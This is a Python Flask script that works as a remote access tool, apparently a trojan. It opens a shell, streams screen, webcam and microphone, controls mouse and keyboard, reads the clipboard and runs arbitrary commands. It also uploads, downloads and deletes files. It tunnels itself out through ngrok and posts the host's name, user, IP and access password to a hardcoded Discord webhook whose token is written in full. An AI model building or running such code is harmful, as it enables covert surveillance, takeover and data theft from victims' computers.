#!/usr/bin/env python3
import os, sys, json, base64, io, time, threading, signal, pty, select, struct, fcntl, termios
import subprocess, requests, tempfile, shutil, mimetypes, re
from datetime import datetime
from flask import Flask, render_template, request, jsonify, send_file, Response, abort
from flask_socketio import SocketIO, emit

WEBHOOK_URL = "https://discord.com/api/webhooks/1516834045026369709/523I42gDEz_0P1WKwi2-q8oNCUNLzulgF2AS749llpNJGsCNvaB9x59fdq8xalKgZGkN"
NGROK_AUTH_TOKEN = ""
PORT = 5000
PASSWORD = "kali"

app = Flask(__name__, template_folder="templates")
app.config["SECRET_KEY"] = os.urandom(16).hex()
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")

shell_fd = None
shell_pid = None
current_dir = os.path.expanduser("~")
camera = None
ngrok_url = None
audio_process = None

ansi_re = re.compile(r'\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])')
def strip_ansi(text): return ansi_re.sub('', text)

# ===== SHELL =====
def start_shell():
    global shell_fd, shell_pid
    pid, fd = pty.fork()
    if pid == 0:
        os.environ["TERM"] = "xterm-256color"
        os.execve("/bin/bash", ["/bin/bash"], os.environ)
    else:
        shell_fd = fd
        shell_pid = pid
        threading.Thread(target=shell_reader, daemon=True).start()

def shell_reader():
    buf = ""
    while True:
        try:
            r, _, _ = select.select([shell_fd], [], [], 0.1)
            if r:
                data = os.read(shell_fd, 4096)
                if not data: break
                decoded = data.decode("utf-8", errors="replace")
                buf += decoded
                if "\n" in decoded or len(buf) > 200:
                    socketio.emit("shell:data", {"data": strip_ansi(buf)})
                    buf = ""
        except: break

def set_window_size(fd, rows, cols):
    winsize = struct.pack("HHHH", rows, cols, 0, 0)
    fcntl.ioctl(fd, termios.TIOCSWINSZ, winsize)

# ===== SCREEN =====
def capture_screen():
    try:
        r = subprocess.run(["import", "-window", "root", "-quality", "70", "png:-"], capture_output=True, timeout=5)
        if r.stdout: return base64.b64encode(r.stdout).decode()
    except: pass
    try:
        import mss
        with mss.mss() as sct:
            from PIL import Image
            buf = io.BytesIO()
            Image.frombytes("RGB", sct.grab(sct.monitors[1]).size, sct.grab(sct.monitors[1]).rgb).save(buf, "JPEG", quality=70)
            return base64.b64encode(buf.getvalue()).decode()
    except: return None

def screen_stream():
    while True:
        try:
            img = capture_screen()
            if img: socketio.emit("screen:frame", {"image": img})
            time.sleep(0.1)
        except: break

# ===== WEBCAM =====
def get_webcam():
    global camera
    try:
        import cv2
        if camera is None: camera = cv2.VideoCapture(0)
        ret, frame = camera.read()
        if ret:
            _, buf = cv2.imencode(".jpg", frame, [cv2.IMWRITE_JPEG_QUALITY, 60])
            return base64.b64encode(buf).decode()
    except: pass
    return None

def webcam_stream():
    while True:
        try:
            img = get_webcam()
            if img: socketio.emit("webcam:frame", {"image": img})
            time.sleep(0.08)
        except: break

# ===== REMOTE CONTROL =====
def get_screen_size():
    try:
        r = subprocess.run(["xdotool", "getdisplaygeometry"], capture_output=True, text=True, timeout=5)
        w, h = r.stdout.strip().split()
        return int(w), int(h)
    except: return 1920, 1080

def remote_mousemove(x, y): subprocess.run(["xdotool", "mousemove", "--sync", str(x), str(y)], timeout=5)
def remote_click(b): subprocess.run(["xdotool", "click", {"left":"1","middle":"2","right":"3"}.get(b,"1")], timeout=5)
def remote_mousedown(b): subprocess.run(["xdotool", "mousedown", {"left":"1","middle":"2","right":"3"}.get(b,"1")], timeout=5)
def remote_mouseup(b): subprocess.run(["xdotool", "mouseup", {"left":"1","middle":"2","right":"3"}.get(b,"1")], timeout=5)
def remote_key(k): subprocess.run(["xdotool", "key", k], timeout=5)
def remote_type(t): subprocess.run(["xdotool", "type", "--", t], timeout=5)

# ===== AUDIO STREAMING =====
audio_running = False
def audio_stream():
    global audio_running
    audio_running = True
    try:
        import pyaudio
        p = pyaudio.PyAudio()
        stream = p.open(format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=4096)
        while audio_running:
            data = stream.read(4096, exception_on_overflow=False)
            socketio.emit("audio:data", base64.b64encode(data).decode())
        stream.close(); p.terminate()
    except:
        proc = subprocess.Popen(["parec", "--format=s16le", "--rate=44100", "--channels=1", "--raw"],
                                stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
        while audio_running:
            data = proc.stdout.read(4096)
            if not data: break
            socketio.emit("audio:data", base64.b64encode(data).decode())
        proc.kill()

def start_audio():
    global audio_running
    if not audio_running:
        threading.Thread(target=audio_stream, daemon=True).start()

def stop_audio():
    global audio_running
    audio_running = False

# ===== CLIPBOARD =====
def clipboard_get():
    try:
        r = subprocess.run(["xclip", "-selection", "clipboard", "-o"], capture_output=True, text=True, timeout=5)
        return r.stdout
    except: return ""

def clipboard_set(text):
    try:
        p = subprocess.Popen(["xclip", "-selection", "clipboard", "-i"], stdin=subprocess.PIPE)
        p.communicate(text.encode(), timeout=5)
        return True
    except: return False

# ===== POWER =====
POWER_ACTIONS = {
    "shutdown": ["shutdown", "-h", "now"],
    "reboot": ["shutdown", "-r", "now"],
    "suspend": ["systemctl", "suspend"],
    "logout": ["pkill", "-KILL", "-u", os.getenv("USER", "")]
}

# ===== FILE OPS =====
def safe_path(path):
    global current_dir
    if not os.path.isabs(path): path = os.path.join(current_dir, path)
    return os.path.realpath(path)

def check_auth(req):
    auth = req.headers.get("Authorization", "") or req.args.get("auth", "")
    return auth == PASSWORD

@app.before_request
def before_request():
    if request.endpoint and request.endpoint not in ("panel", "static") and request.method != "OPTIONS":
        if not check_auth(request):
            return jsonify({"error": "Unauthorized"}), 401

@app.route("/")
def panel():
    a = request.args.get("auth", "")
    if a != PASSWORD:
        return '<html><body style="background:#000;color:#0f0;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh"><form method="GET"><input type="password" name="auth" placeholder="Password" style="background:#111;color:#0f0;border:1px solid#0f0;padding:10px;font-family:monospace;font-size:16px"><input type="submit" value="ENTRER" style="background:#0f0;color:#000;border:none;padding:10px;font-family:monospace;font-size:16px;cursor:pointer"></form></body></html>'
    return render_template("panel.html", password=PASSWORD)

@app.route("/api/auth", methods=["POST"])
def api_auth():
    return jsonify({"ok": request.json.get("password") == PASSWORD})

@app.route("/api/screenshot")
def api_screenshot():
    img = capture_screen()
    return (jsonify({"image": img}) if img else (jsonify({"error": "Failed"}), 500))

@app.route("/api/webcam")
def api_webcam():
    img = get_webcam()
    return (jsonify({"image": img}) if img else (jsonify({"error": "No camera"}), 500))

@app.route("/api/ls")
def api_ls():
    global current_dir
    path = request.args.get("path", current_dir)
    real = safe_path(path)
    if not os.path.isdir(real): return jsonify({"error": "Not a directory"}), 400
    current_dir = real
    items = []
    for item in os.listdir(real):
        full = os.path.join(real, item)
        try:
            items.append({"name": item, "type": "dir" if os.path.isdir(full) else "file",
                          "size": os.path.getsize(full) if os.path.isfile(full) else 0, "mtime": os.path.getmtime(full)})
        except: pass
    return jsonify({"path": real, "items": items})

@app.route("/api/download")
def api_download():
    path = safe_path(request.args.get("path", ""))
    if not os.path.isfile(path): abort(404)
    return send_file(path, as_attachment=True)

@app.route("/api/upload", methods=["POST"])
def api_upload():
    path = safe_path(request.args.get("path", current_dir))
    if "file" not in request.files: return jsonify({"error": "No file"}), 400
    file = request.files["file"]
    file.save(os.path.join(path, file.filename))
    return jsonify({"ok": True})

@app.route("/api/read", methods=["POST"])
def api_read():
    path = safe_path(request.json.get("path", ""))
    if not os.path.isfile(path): return jsonify({"error": "Not a file"}), 404
    try:
        with open(path, "r", encoding="utf-8", errors="replace") as f:
            return jsonify({"content": f.read(), "path": path})
    except Exception as e: return jsonify({"error": str(e)}), 500

@app.route("/api/write", methods=["POST"])
def api_write():
    d = request.json
    path = safe_path(d.get("path", ""))
    try:
        with open(path, "w", encoding="utf-8") as f: f.write(d.get("content", ""))
        return jsonify({"ok": True})
    except Exception as e: return jsonify({"error": str(e)}), 500

@app.route("/api/delete", methods=["POST"])
def api_delete():
    path = safe_path(request.json.get("path", ""))
    if os.path.isfile(path): os.remove(path)
    elif os.path.isdir(path): shutil.rmtree(path)
    else: return jsonify({"error": "Not found"}), 404
    return jsonify({"ok": True})

@app.route("/api/exec", methods=["POST"])
def api_exec():
    try:
        r = subprocess.run(["bash", "-c", request.json.get("cmd","")], capture_output=True, text=True, timeout=30)
        return jsonify({"stdout": strip_ansi(r.stdout), "stderr": strip_ansi(r.stderr), "code": r.returncode})
    except subprocess.TimeoutExpired: return jsonify({"error": "Timeout"}), 500

@app.route("/api/clipboard", methods=["GET", "POST"])
def api_clipboard():
    if request.method == "GET":
        return jsonify({"content": clipboard_get()})
    clipboard_set(request.json.get("content", ""))
    return jsonify({"ok": True})

@app.route("/api/power", methods=["POST"])
def api_power():
    action = request.json.get("action", "")
    cmd = POWER_ACTIONS.get(action)
    if not cmd: return jsonify({"error": "Invalid action"}), 400
    threading.Thread(target=lambda: subprocess.run(cmd), daemon=True).start()
    return jsonify({"ok": True, "action": action})

@app.route("/api/info")
def api_info():
    try:
        uname = os.uname()
        ip = requests.get("https://api.ipify.org", timeout=5).text.strip()
        sw, sh = get_screen_size()
        return jsonify({
            "hostname": os.popen("hostname").read().strip(),
            "os": f"{uname.sysname} {uname.release}",
            "user": os.getenv("USER", "unknown"), "cwd": current_dir, "ip": ip,
            "screen": f"{sw}x{sh}", "screen_w": sw, "screen_h": sh,
            "uptime": os.popen("uptime -p").read().strip() if os.path.exists("/proc/uptime") else "N/A"
        })
    except Exception as e: return jsonify({"error": str(e)})

@app.route("/api/sysinfo")
def api_sysinfo():
    try:
        mem = {}
        with open("/proc/meminfo") as f:
            for line in f:
                if "MemTotal" in line: mem["total"] = int(line.split()[1])//1024
                if "MemAvailable" in line: mem["avail"] = int(line.split()[1])//1024
                if "SwapTotal" in line: mem["swap_total"] = int(line.split()[1])//1024
                if "SwapFree" in line: mem["swap_free"] = int(line.split()[1])//1024
        if "avail" in mem: mem["used"] = mem["total"] - mem["avail"]
        disk = shutil.disk_usage("/")
        cpu_model = os.popen("grep 'model name' /proc/cpuinfo | head -1").read().strip().split(":")[-1].strip() if os.path.exists("/proc/cpuinfo") else "N/A"
        cores = os.cpu_count() or 0
        load = os.getloadavg() if hasattr(os, "getloadavg") else (0,0,0)
        # Temperatures
        temps = []
        if os.path.exists("/sys/class/thermal"):
            for z in sorted(os.listdir("/sys/class/thermal")):
                if z.startswith("thermal_zone"):
                    try:
                        t = open(f"/sys/class/thermal/{z}/temp").read().strip()
                        t_type = open(f"/sys/class/thermal/{z}/type").read().strip()
                        temps.append({"zone": z, "type": t_type, "temp_c": round(int(t)/1000, 1) if t else 0})
                    except: pass
        # GPU temperature
        gpu_temp = None
        try:
            r = subprocess.run(["nvidia-smi", "--query-gpu=temperature.gpu", "--format=csv,noheader"],
                               capture_output=True, text=True, timeout=5)
            if r.stdout.strip(): gpu_temp = int(r.stdout.strip())
        except: pass
        if not gpu_temp and os.path.exists("/sys/class/drm"):
            try:
                for d in os.listdir("/sys/class/drm"):
                    p = f"/sys/class/drm/{d}/device/hwmon/hwmon*/temp1_input"
                    import glob as gb
                    for f in gb.glob(p):
                        t = open(f).read().strip()
                        if t: gpu_temp = round(int(t)/1000, 1)
            except: pass

        return jsonify({
            "memory": {"total_mb": mem.get("total", 0), "used_mb": mem.get("used", 0), "avail_mb": mem.get("avail", 0),
                       "swap_total_mb": mem.get("swap_total", 0), "swap_free_mb": mem.get("swap_free", 0)},
            "disk": {"total_gb": round(disk.total/(1024**3),1), "used_gb": round(disk.used/(1024**3),1),
                     "free_gb": round(disk.free/(1024**3),1), "percent": round(disk.used/disk.total*100,1)},
            "cpu": {"model": cpu_model, "cores": cores, "load_1m": round(load[0],2), "load_5m": round(load[1],2), "load_15m": round(load[2],2)},
            "temperatures": {"cpu": temps, "gpu_c": gpu_temp},
            "processes": len(os.popen("ps aux").read().split("\n")) - 1 if os.path.exists("/usr/bin/ps") else 0
        })
    except Exception as e: return jsonify({"error": str(e)})

# ===== SOCKETIO =====
@socketio.on("shell:input")
def on_shell_input(d):
    global shell_fd
    if shell_fd:
        try: os.write(shell_fd, d["data"].encode())
        except: pass

@socketio.on("shell:resize")
def on_shell_resize(d):
    global shell_fd
    if shell_fd: set_window_size(shell_fd, d.get("rows", 24), d.get("cols", 80))

@socketio.on("start:screen")
def on_start_screen(): threading.Thread(target=screen_stream, daemon=True).start()

@socketio.on("start:webcam")
def on_start_webcam(): threading.Thread(target=webcam_stream, daemon=True).start()

@socketio.on("audio:start")
def on_audio_start(): start_audio()

@socketio.on("audio:stop")
def on_audio_stop(): stop_audio()

@socketio.on("remote:mousemove")
def on_remote_mousemove(d): threading.Thread(target=remote_mousemove, args=(d["x"],d["y"]), daemon=True).start()

@socketio.on("remote:click")
def on_remote_click(d): remote_click(d.get("button","left"))

@socketio.on("remote:mousedown")
def on_remote_mousedown(d): remote_mousedown(d.get("button","left"))

@socketio.on("remote:mouseup")
def on_remote_mouseup(d): remote_mouseup(d.get("button","left"))

@socketio.on("remote:key")
def on_remote_key(d): remote_key(d["key"])

@socketio.on("remote:type")
def on_remote_type(d): remote_type(d["text"])

# ===== NGROK =====
def start_ngrok():
    global ngrok_url
    try:
        from pyngrok import ngrok as ng
        if NGROK_AUTH_TOKEN: ng.set_auth_token(NGROK_AUTH_TOKEN)
        ngrok_url = ng.connect(PORT, "http").public_url
        print(f"[+] Ngrok URL: {ngrok_url}"); return ngrok_url
    except: pass
    try:
        subprocess.Popen(["ngrok", "http", str(PORT), "--log", "stdout"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(3)
        r = requests.get("http://127.0.0.1:4040/api/tunnels", timeout=5)
        ngrok_url = r.json()["tunnels"][0]["public_url"]
        print(f"[+] Ngrok URL: {ngrok_url}"); return ngrok_url
    except: return None

def send_webhook(url):
    try:
        host = os.popen("hostname").read().strip()
        user = os.getenv("USER", "unknown")
        ip = requests.get("https://api.ipify.org", timeout=5).text.strip()
        requests.post(WEBHOOK_URL, json={"embeds": [{
            "title": "🚀 Kali Agent Prêt", "color": 5763719,
            "fields": [
                {"name": "🔗 Panel", "value": f"{url}?auth={PASSWORD}", "inline": False},
                {"name": "🖥 Hostname", "value": host, "inline": True},
                {"name": "👤 User", "value": user, "inline": True},
                {"name": "🌍 IP", "value": ip, "inline": True},
                {"name": "🔑 Password", "value": f"`{PASSWORD}`", "inline": True}
            ],
            "footer": {"text": datetime.now().strftime("%d/%m/%Y %H:%M:%S")}
        }]}, timeout=10)
        print("[+] Webhook envoyé")
    except Exception as e: print(f"[-] Webhook error: {e}")

if __name__ == "__main__":
    print("[+] Démarrage de l'agent Kali..."); print(f"[+] Port: {PORT}")
    start_shell(); print("[+] Shell PTY démarré")
    url = start_ngrok()
    if url:
        print(f"[+] URL: {url}?auth={PASSWORD}")
        send_webhook(url)
    else:
        print(f"[-] Local: http://127.0.0.1:{PORT}")
    socketio.run(app, host="0.0.0.0", port=PORT, debug=False, allow_unsafe_werkzeug=True)
